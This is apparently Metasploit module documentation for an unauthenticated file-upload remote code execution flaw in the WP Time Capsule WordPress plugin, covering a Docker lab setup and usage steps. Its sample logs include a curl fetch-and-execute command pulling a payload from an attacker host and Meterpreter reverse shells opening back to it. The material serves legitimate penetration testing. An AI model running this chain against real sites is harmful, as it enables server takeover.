## Vulnerable Application

This Metasploit module exploits a Remote Code Execution vulnerability in the WordPress WP Time Capsule plugin, versions <= 1.22.21.
The vulnerability arises from an unauthenticated arbitrary file upload flaw due to improper validation logic in the plugin.

To replicate a vulnerable environment for testing:

1. Install WordPress using the provided Docker Compose configuration.
2. Download and install the [WP Time Capsule plugin v1.22.21](https://downloads.wordpress.org/plugin/wp-time-capsule.1.22.21.zip).
3. Verify that the plugin is activated and accessible on the local network.
4. Register for a WP Time Capsule account and connect the plugin to an external storage system (e.g., Google Drive, Dropbox).
5. Access `wp-admin/admin.php?page=wp-time-capsule-settings#wp-time-capsule-tab-advanced` to enable the **file upload functionality**
by clicking **"Click here to show upload options"**.
This action triggers the `prepare_file_upload_index_file_wptc` function, which creates the required `index.php` file
in the `/wp-tcapsule-bridge/upload/php/` directory, making the issue exploitable.

## Docker Compose Configuration

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:6.3.2
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: root
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 8G
    volumes:
      - wordpress:/var/www/html
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: root
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

Create a `custom.ini` file with the following content:

```ini
upload_max_filesize = 64M
post_max_size = 64M
```

## Verification Steps

1. Set up a WordPress instance with the WP Time Capsule plugin (version 1.22.21) using the provided `docker-compose.yml`.
2. Launch `msfconsole` in your Metasploit framework.
3. Use the module: `use exploit/multi/http/wp_time_capsule_file_upload_rce`.
4. Set `RHOSTS` to the IP address or hostname of the target.
5. Configure necessary options such as `TARGETURI`, `SSL`, and `RPORT`.
6. Execute the exploit using the `run` or `exploit` command.
7. If the target is vulnerable, the module will execute the specified payload and return a session.

## Options

No additional options are required beyond the default ones provided in Metasploit.

## Scenarios

### Successful Exploitation Against WordPress with WP Time Capsule 1.22.21

**Setup**:

- Local WordPress instance with WP Time Capsule version 1.22.21.
- Metasploit Framework.

**Steps**:

1. Start `msfconsole`.
2. Load the module:
```bash
use exploit/multi/http/wp_time_capsule_file_upload_rce
```
3. Set `RHOSTS` to the target's IP (e.g., `172.18.0.3`).
4. Configure other necessary options (e.g., `TARGETURI`).
5. Launch the exploit:
```bash
exploit
```

**Expected Results**:

With `php/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_time_capsule_file_upload_rce) > run http://172.18.0.3

[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/wp-time-capsule/readme.txt
[*] Found version 1.22.21 in the plugin
[+] The target appears to be vulnerable. WP Time Capsule plugin appears to be vulnerable.
[*] Uploading payload: rJ.php with MIME type: message/http...
[+] Payload uploaded successfully. Parsing response...
[*] Triggering the payload at: http://172.18.0.3/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/files/rJ.php
[*] Sending stage (40004 bytes) to 172.18.0.3
[+] Deleted rJ.php
[*] Meterpreter session 3 opened (192.168.1.36:4444 -> 172.18.0.3:42434) at 2024-12-11 00:48:18 +0100

meterpreter > sysinfo 
Computer    : 0bd3f3b7102e
OS          : Linux 0bd3f3b7102e 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Meterpreter : php/linux
```

With `cmd/linux/http/x64/meterpreter/reverse_tcp`:

```plaintext
msf6 exploit(multi/http/wp_time_capsule_file_upload_rce) > run http://172.18.0.3

[*] Command to run on remote host: curl -so ./EHsooyPGi http://192.168.1.36:8080/LoPlnjEpeOexZNVppn6cAA; chmod +x ./EHsooyPGi; ./EHsooyPGi &
[*] Fetch handler listening on 192.168.1.36:8080
[*] HTTP server started
[*] Adding resource /LoPlnjEpeOexZNVppn6cAA
[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/wp-time-capsule/readme.txt
[*] Found version 1.22.21 in the plugin
[+] The target appears to be vulnerable. WP Time Capsule plugin appears to be vulnerable.
[*] Uploading payload: Ps.php with MIME type: application/zip...
[+] Payload uploaded successfully. Parsing response...
[*] Triggering the payload at: http://172.18.0.3/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload/php/files/Ps.php
[*] Client 172.18.0.3 requested /LoPlnjEpeOexZNVppn6cAA
[*] Sending payload to 172.18.0.3 (curl/7.74.0)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 172.18.0.3
[+] Deleted Ps.php
[*] Meterpreter session 4 opened (192.168.1.36:4444 -> 172.18.0.3:50396) at 2024-12-11 01:06:52 +0100

meterpreter > sysinfo 
Computer     : 172.18.0.3
OS           : Debian 11.8 (Linux 5.15.0-126-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
